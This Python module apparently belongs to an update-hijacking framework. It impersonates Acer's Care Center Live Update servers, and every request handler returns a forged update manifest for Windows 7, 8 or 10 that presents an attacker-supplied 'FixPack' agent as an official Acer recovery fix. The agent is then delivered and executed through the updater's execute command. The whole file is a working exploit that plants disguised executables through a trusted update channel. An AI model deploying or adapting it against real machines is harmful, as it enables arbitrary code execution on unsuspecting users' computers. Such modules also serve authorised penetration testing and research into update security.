from modules import ModuleBase


class Acer(ModuleBase):
    name = 'acer'
    version = '1.0'
    appver = 'All'
    auther = ['Matias Ariel Re Medina <mre[at]infobytesec[dot]com>']
    description = "Acer Care Center Live Update"
    agent_filename = './agent/Fixpack-B_simple.zip'
    vh = 'ws.gtm.acer.com|wstw.gtm.acer.com|global-download.acer.com'
    options = {
        'zipname': {
            'val': 'FixPack_Acer_1.00.0000_Wx86Wx64_A.zip',
            'desc': 'Must have the "FixPack" in it.'
        },
        'executecmd': {
            'val': 'fpx.xml.agent.exe',
            'desc': 'Must have fpx.xml in it. Normally it would be bat file like FpInstall.bat.'
        }
    }
    requests = [{
            'path': 'ServerInfo\/[\w+%-\/]*_8M2_\w+.xml',
            'type': 'string',
            'method': '',
            'bin': '0',
            'string': """<?xml version="1.0" encoding="utf-8"?>
<AcerLiveUpdate Version="1.0">
    <AcerMsg Msg="?Step1=Test&amp;Step2=Test&amp;Step3=alu_app&amp;OS=8m2&amp;LC=en&amp;SN=" />
    <Application>
        <Node ObjID="47309875" FileID="167716" RO="AAP_1;AAP_10;AAP_10E;AAP_10G;AAP_11;AAP_1E;AAP_1G;AAP_2;AAP_2E;AAP_2G;AAP_3;AAP_3E;AAP_3G;AAP_4;AAP_4E;AAP_4G;AAP_5;AAP_5E;AAP_5G;AAP_6;AAP_6E;AAP_6G;AAP_7;AAP_7E;AAP_7G;AAP_8;AAP_8E;AAP_8G;AAP_9;AAP_9E;AAP_9G;CHINA_1;CHINA_1E;CHINA_1F;CHINA_1G;CHINA_2;CHINA_2E;CHINA_2F;CHINA_2G;EMEA_1;EMEA_10;EMEA_11;EMEA_11E;EMEA_11P;EMEA_12;EMEA_12E;EMEA_12P;EMEA_13;EMEA_13E;EMEA_13P;EMEA_14;EMEA_14E;EMEA_14P;EMEA_15;EMEA_15E;EMEA_16;EMEA_16E;EMEA_16P;EMEA_17;EMEA_17E;EMEA_17P;EMEA_18;EMEA_18E;EMEA_18P;EMEA_19;EMEA_19E;EMEA_19P;EMEA_1E;EMEA_2;EMEA_20;EMEA_20E;EMEA_20P;EMEA_21;EMEA_21E;EMEA_21P;EMEA_22;EMEA_22E;EMEA_23;EMEA_23E;EMEA_23P;EMEA_24;EMEA_24E;EMEA_24P;EMEA_25;EMEA_25E;EMEA_25P;EMEA_26;EMEA_26E;EMEA_27;EMEA_27E;EMEA_27G;EMEA_27P;EMEA_28;EMEA_28E;EMEA_2E;EMEA_3;EMEA_3E;EMEA_3P;EMEA_4;EMEA_4P;EMEA_5;EMEA_5E;EMEA_5P;EMEA_6;EMEA_6P;EMEA_7;EMEA_7E;EMEA_7P;EMEA_8;EMEA_8E;EMEA_8P;EMEA_9;EMEA_9E;EMEA_9P;PA_1;PA_2;PA_2E;PA_2G;PA_3;PA_3E;PA_4;PA_4E;PA_4G;PA_5;PA_6;PA_6E;PA_6G;PA_7;TWN_1;TWN_1E;TWN_1G;" Name="Windows 8 Recovery compatible issue fixed" Class="FixPack" Version="1.00.0000" FileSize="<%AGENTSIZE%>" InstallFile="Application\FixPack\635792876087082683_<%ZIPNAME%>" ExecuteCmd="<%EXECUTECMD%>" Reboot="N" InstallType="P" Publisher="Acer" Description="Windows 8 Recovery compatible issue fixed" GUID="{4A0E1891-A35C-478E-8685-EA6F07152A17}" R2="" R3="" R4="" R5="" R6="" R7="80228" R8="80241" R9="3" RA="-~-"></Node>
    </Application>
</AcerLiveUpdate>""",
            'parse': '1',
            'file': '',
        }, {   
            'path': 'ServerInfo\/[\w+%-\/]*_8M1_\w+.xml',
            'type': 'string',
            'method': '',
            'bin': '0',
            'string': """<?xml version="1.0" encoding="utf-8"?>
<AcerLiveUpdate Version="1.0">
    <AcerMsg Msg="?Step1=Test&amp;Step2=Test&amp;Step3=alu_app&amp;OS=8m1&amp;LC=en&amp;SN=" />
    <Application>
        <Node ObjID="47309875" FileID="167716" RO="AAP_1;AAP_10;AAP_10E;AAP_10G;AAP_11;AAP_1E;AAP_1G;AAP_2;AAP_2E;AAP_2G;AAP_3;AAP_3E;AAP_3G;AAP_4;AAP_4E;AAP_4G;AAP_5;AAP_5E;AAP_5G;AAP_6;AAP_6E;AAP_6G;AAP_7;AAP_7E;AAP_7G;AAP_8;AAP_8E;AAP_8G;AAP_9;AAP_9E;AAP_9G;CHINA_1;CHINA_1E;CHINA_1F;CHINA_1G;CHINA_2;CHINA_2E;CHINA_2F;CHINA_2G;EMEA_1;EMEA_10;EMEA_11;EMEA_11E;EMEA_11P;EMEA_12;EMEA_12E;EMEA_12P;EMEA_13;EMEA_13E;EMEA_13P;EMEA_14;EMEA_14E;EMEA_14P;EMEA_15;EMEA_15E;EMEA_16;EMEA_16E;EMEA_16P;EMEA_17;EMEA_17E;EMEA_17P;EMEA_18;EMEA_18E;EMEA_18P;EMEA_19;EMEA_19E;EMEA_19P;EMEA_1E;EMEA_2;EMEA_20;EMEA_20E;EMEA_20P;EMEA_21;EMEA_21E;EMEA_21P;EMEA_22;EMEA_22E;EMEA_23;EMEA_23E;EMEA_23P;EMEA_24;EMEA_24E;EMEA_24P;EMEA_25;EMEA_25E;EMEA_25P;EMEA_26;EMEA_26E;EMEA_27;EMEA_27E;EMEA_27G;EMEA_27P;EMEA_28;EMEA_28E;EMEA_2E;EMEA_3;EMEA_3E;EMEA_3P;EMEA_4;EMEA_4P;EMEA_5;EMEA_5E;EMEA_5P;EMEA_6;EMEA_6P;EMEA_7;EMEA_7E;EMEA_7P;EMEA_8;EMEA_8E;EMEA_8P;EMEA_9;EMEA_9E;EMEA_9P;PA_1;PA_2;PA_2E;PA_2G;PA_3;PA_3E;PA_4;PA_4E;PA_4G;PA_5;PA_6;PA_6E;PA_6G;PA_7;TWN_1;TWN_1E;TWN_1G;" Name="Windows 8 Recovery compatible issue fixed" Class="FixPack" Version="1.00.0000" FileSize="<%AGENTSIZE%>" InstallFile="Application\FixPack\635792876087082683_<%ZIPNAME%>" ExecuteCmd="<%EXECUTECMD%>" Reboot="N" InstallType="P" Publisher="Acer" Description="Windows 8 Recovery compatible issue fixed" GUID="{4A0E1891-A35C-478E-8685-EA6F07152A17}" R2="" R3="" R4="" R5="" R6="" R7="80228" R8="80241" R9="3" RA="-~-"></Node>
    </Application>
</AcerLiveUpdate>""",
            'parse': '1',
            'file': '',
        }, {   
            'path': 'ServerInfo\/[\w+%-\/]*_721_\w+.xml',
            'type': 'string',
            'method': '',
            'bin': '0',
            'string' : """<?xml version="1.0" encoding="utf-8"?>
<AcerLiveUpdate Version="1.0">
    <AcerMsg Msg="?Step1=Test&amp;Step2=Test&amp;Step3=alu_app&amp;OS=721&amp;LC=en&amp;SN=" />
    <Application>
        <Node ObjID="47309875" FileID="167716" RO="AAP_1;AAP_10;AAP_10E;AAP_10G;AAP_11;AAP_1E;AAP_1G;AAP_2;AAP_2E;AAP_2G;AAP_3;AAP_3E;AAP_3G;AAP_4;AAP_4E;AAP_4G;AAP_5;AAP_5E;AAP_5G;AAP_6;AAP_6E;AAP_6G;AAP_7;AAP_7E;AAP_7G;AAP_8;AAP_8E;AAP_8G;AAP_9;AAP_9E;AAP_9G;CHINA_1;CHINA_1E;CHINA_1F;CHINA_1G;CHINA_2;CHINA_2E;CHINA_2F;CHINA_2G;EMEA_1;EMEA_10;EMEA_11;EMEA_11E;EMEA_11P;EMEA_12;EMEA_12E;EMEA_12P;EMEA_13;EMEA_13E;EMEA_13P;EMEA_14;EMEA_14E;EMEA_14P;EMEA_15;EMEA_15E;EMEA_16;EMEA_16E;EMEA_16P;EMEA_17;EMEA_17E;EMEA_17P;EMEA_18;EMEA_18E;EMEA_18P;EMEA_19;EMEA_19E;EMEA_19P;EMEA_1E;EMEA_2;EMEA_20;EMEA_20E;EMEA_20P;EMEA_21;EMEA_21E;EMEA_21P;EMEA_22;EMEA_22E;EMEA_23;EMEA_23E;EMEA_23P;EMEA_24;EMEA_24E;EMEA_24P;EMEA_25;EMEA_25E;EMEA_25P;EMEA_26;EMEA_26E;EMEA_27;EMEA_27E;EMEA_27G;EMEA_27P;EMEA_28;EMEA_28E;EMEA_2E;EMEA_3;EMEA_3E;EMEA_3P;EMEA_4;EMEA_4P;EMEA_5;EMEA_5E;EMEA_5P;EMEA_6;EMEA_6P;EMEA_7;EMEA_7E;EMEA_7P;EMEA_8;EMEA_8E;EMEA_8P;EMEA_9;EMEA_9E;EMEA_9P;PA_1;PA_2;PA_2E;PA_2G;PA_3;PA_3E;PA_4;PA_4E;PA_4G;PA_5;PA_6;PA_6E;PA_6G;PA_7;TWN_1;TWN_1E;TWN_1G;" Name="Windows 7 Recovery compatible issue fixed" Class="FixPack" Version="1.00.0000" FileSize="<%AGENTSIZE%>" InstallFile="Application\FixPack\635792876087082683_<%ZIPNAME%>" ExecuteCmd="<%EXECUTECMD%>" Reboot="N" InstallType="P" Publisher="Acer" Description="Windows 7 Recovery compatible issue fixed" GUID="{4A0E1891-A35C-478E-8685-EA6F07152A17}" R2="" R3="" R4="" R5="" R6="" R7="80228" R8="80241" R9="3" RA="-~-"></Node>
    </Application>
</AcerLiveUpdate>""",
            'parse': '1',
            'file': '',
        }, {   
            'path': 'ServerInfo\/[\w+%-\/]*_10m1_\w+.xml',
            'type': 'string',
            'method': '',
            'bin': 0,
            'string' : """<?xml version="1.0" encoding="utf-8"?>
<AcerLiveUpdate Version="1.0">
    <AcerMsg Msg="?Step1=Test&amp;Step2=Test&amp;Step3=alu_app&amp;OS=10m1&amp;LC=en&amp;SN=" />
    <Application>
        <Node ObjID="47309875" FileID="167716" RO="AAP_1;AAP_10;AAP_10E;AAP_10G;AAP_11;AAP_1E;AAP_1G;AAP_2;AAP_2E;AAP_2G;AAP_3;AAP_3E;AAP_3G;AAP_4;AAP_4E;AAP_4G;AAP_5;AAP_5E;AAP_5G;AAP_6;AAP_6E;AAP_6G;AAP_7;AAP_7E;AAP_7G;AAP_8;AAP_8E;AAP_8G;AAP_9;AAP_9E;AAP_9G;CHINA_1;CHINA_1E;CHINA_1F;CHINA_1G;CHINA_2;CHINA_2E;CHINA_2F;CHINA_2G;EMEA_1;EMEA_10;EMEA_11;EMEA_11E;EMEA_11P;EMEA_12;EMEA_12E;EMEA_12P;EMEA_13;EMEA_13E;EMEA_13P;EMEA_14;EMEA_14E;EMEA_14P;EMEA_15;EMEA_15E;EMEA_16;EMEA_16E;EMEA_16P;EMEA_17;EMEA_17E;EMEA_17P;EMEA_18;EMEA_18E;EMEA_18P;EMEA_19;EMEA_19E;EMEA_19P;EMEA_1E;EMEA_2;EMEA_20;EMEA_20E;EMEA_20P;EMEA_21;EMEA_21E;EMEA_21P;EMEA_22;EMEA_22E;EMEA_23;EMEA_23E;EMEA_23P;EMEA_24;EMEA_24E;EMEA_24P;EMEA_25;EMEA_25E;EMEA_25P;EMEA_26;EMEA_26E;EMEA_27;EMEA_27E;EMEA_27G;EMEA_27P;EMEA_28;EMEA_28E;EMEA_2E;EMEA_3;EMEA_3E;EMEA_3P;EMEA_4;EMEA_4P;EMEA_5;EMEA_5E;EMEA_5P;EMEA_6;EMEA_6P;EMEA_7;EMEA_7E;EMEA_7P;EMEA_8;EMEA_8E;EMEA_8P;EMEA_9;EMEA_9E;EMEA_9P;PA_1;PA_2;PA_2E;PA_2G;PA_3;PA_3E;PA_4;PA_4E;PA_4G;PA_5;PA_6;PA_6E;PA_6G;PA_7;TWN_1;TWN_1E;TWN_1G;" Name="Windows 10 Recovery compatible issue fixed" Class="FixPack" Version="1.00.0000" FileSize="<%AGENTSIZE%>" InstallFile="Application\FixPack\635792876087082683_<%ZIPNAME%>" ExecuteCmd="<%EXECUTECMD%>" Reboot="N" InstallType="P" Publisher="Acer" Description="Windows 10 Recovery compatible issue fixed" GUID="{4A0E1891-A35C-478E-8685-EA6F07152A17}" R2="" R3="" R4="" R5="" R6="" R7="80228" R8="80241" R9="3" RA="-~-"></Node>
    </Application>
</AcerLiveUpdate>""",
            'parse': '1',
            'file': '',
        }, {   
            'path': 'FixPack(\w+|\.)*.zip',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': '0',
            'file': ''
        }]
